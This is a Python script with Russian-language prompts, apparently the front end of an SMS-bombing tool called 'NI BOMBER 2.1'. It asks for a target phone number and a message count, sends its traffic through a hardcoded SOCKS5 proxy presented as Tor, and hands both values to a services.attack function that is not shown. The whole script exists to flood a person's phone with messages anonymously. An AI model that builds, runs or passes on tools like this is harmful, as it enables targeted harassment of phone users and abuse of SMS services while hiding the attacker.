import requests
import datetime
import services

class color:
	Green = '\033[92m'
	Cyan = '\033[95m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
	END = '\033[0m'

print(color.Green + color.BOLD + '     ' + color.UNDERLINE + '[NI BOMBER 2.1]' + color.END)
print(color.Cyan + color.BOLD + "-"*25 + color.END)
print(color.Cyan + color.BOLD + '| coded by  | nikait    |\n' + '| telegram: | @aaanikit |' + color.END)
print(color.Cyan + color.BOLD + "-"*25 + color.END)
print('')


print('введите номер без префиксов\nпример: 9018017010')
number = input(color.Green + color.BOLD + '>> ' + color.END)
print('сколько sms отправить?')
sms = int(input(color.Green + color.BOLD + '>> ' + color.END))

def check_number(number):
	if int(len(number)) == 10 and int(number[1]) == 9:
		print('[*]check number -' + color.Green + color.BOLD + ' OK' + color.END)
	else:
		print('[*]check number -' + color.Green + color.BOLD + ' неправильный номер' + color.END)
		quit()
check_number(number)

print('[*]запуск ' + color.Cyan + color.BOLD + 'Tor' + color.END + '...')

proxies = {
    'http': 'socks5://139.59.53.105:1080',
    'https': 'socks5://139.59.53.105:1080'
}

tor = requests.get('http://icanhazip.com/', proxies=proxies).text
tor = (tor.replace('\n',''))

print('[*]запуск ' + color.Cyan + color.BOLD + 'Tor' + color.END + ' - ' +  color.Green + color.BOLD + 'OK ваше очко в безопасности' + color.END)

services.attack(number, sms)
